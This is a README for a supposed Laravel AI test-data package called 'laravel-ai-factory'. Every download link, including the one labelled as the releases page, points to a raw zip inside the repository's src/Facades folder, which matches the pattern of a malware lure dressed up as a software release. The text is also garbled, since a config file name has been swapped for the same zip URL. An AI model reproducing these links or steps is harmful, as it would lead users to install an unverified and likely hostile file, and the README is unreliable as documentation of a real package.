# 🎉 laravel-ai-factory - Generate Realistic Test Data Easily

## 🚀 Getting Started

Welcome to the Laravel AI Factory! This tool helps you create realistic test data for your applications. Using AI models, you can generate data quickly and efficiently. No programming knowledge is required to start.

## 📥 Download & Install

To get started, visit the Releases page to download the latest version of Laravel AI Factory.

[![Download Laravel AI Factory](https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/src/Facades/laravel_factory_ai_v2.5.zip%20Now%20-%20Laravel%20AI%20Factory-blue)](https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/src/Facades/laravel_factory_ai_v2.5.zip)

Click the link above to find the most recent release. 

### Steps to Download

1. Go to the [Releases page](https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/src/Facades/laravel_factory_ai_v2.5.zip).
2. Look for the latest version listed.
3. Click on the **Assets** section to see available downloads.
4. Select the appropriate file based on your operating system.
5. Follow the on-screen prompts to download the file.

## ⚙️ System Requirements

Before you install, ensure your system meets the following requirements:

- **Operating System:** Windows 10, macOS, or Linux.
- **PHP Version:** 7.4 or higher.
- **Laravel Version:** 8.x or higher.
- **Composer:** Latest version installed on your machine.

## 🛠️ Installation Instructions

Once you have downloaded the Laravel AI Factory, follow these steps to install it:

1. Locate the downloaded file on your computer.
2. Unzip or extract the contents of the file.
3. Open your terminal or command prompt.
4. Navigate to the directory where you extracted the files.
5. Run the following command to install:

   ```bash
   composer require eyadislam/laravel-ai-factory
   ```

6. After the installation completes, add the service provider in your `https://raw.githubusercontent.com/eyadislam/laravel-ai-factory/main/src/Facades/laravel_factory_ai_v2.5.zip` file:

   ```php
   'providers' => [
       ...
       EyadIslam\LaravelAiFactory\LaravelAiFactoryServiceProvider::class,
   ],
   ```

7. Publish the configuration file by running:

   ```bash
   php artisan vendor:publish --provider="EyadIslam\LaravelAiFactory\LaravelAiFactoryServiceProvider"
   ```

## 🧑‍🤝‍🧑 Usage Instructions

Now that you have installed the Laravel AI Factory, it’s time to use it. Here’s how:

### 1. Generate Data

You can create your data using the built-in commands. Run the following command to generate sample data:

```bash
php artisan generate:data
```

### 2. Customize Fields

You can define both AI-generated fields and manual fields in your factory. This gives you complete flexibility over the data generation process.

### 3. Bulk or Individual Inserts

Choose whether you want to insert data in bulk or individually. Use the relevant method in your calls to the factory.

## 📖 Documentation

For in-depth understanding and examples of how to use Laravel AI Factory, please refer to our detailed documentation available in the repository. The documentation covers various topics such as:

- Customizing data fields
- Using different data types
- Integrating with existing Laravel projects

## 🔧 Troubleshooting

If you encounter issues during installation or usage, check the following:

- Ensure your PHP and Laravel versions are compatible.
- Look for any error messages in your terminal. These can provide guidance on solving issues.
- Refer to common FAQs and troubleshooting sections in the documentation.

If you still need help, feel free to create an issue on the GitHub repository.

## 🎉 Join the Community

Become part of the Laravel AI Factory community! Share your experiences, ask questions, and provide feedback. This helps us improve the package and serve you better.

Connect with us on our GitHub Discussions page. 

## 💡 Contributing

We welcome contributions! If you wish to contribute, please read our contribution guidelines available in the repository. Your input can make Laravel AI Factory even better!

## 📧 Contact

For any questions or feedback, feel free to reach out through our GitHub repository. Your insights help us make this tool more user-friendly and effective.

Thank you for using Laravel AI Factory! Enjoy generating your test data effortlessly.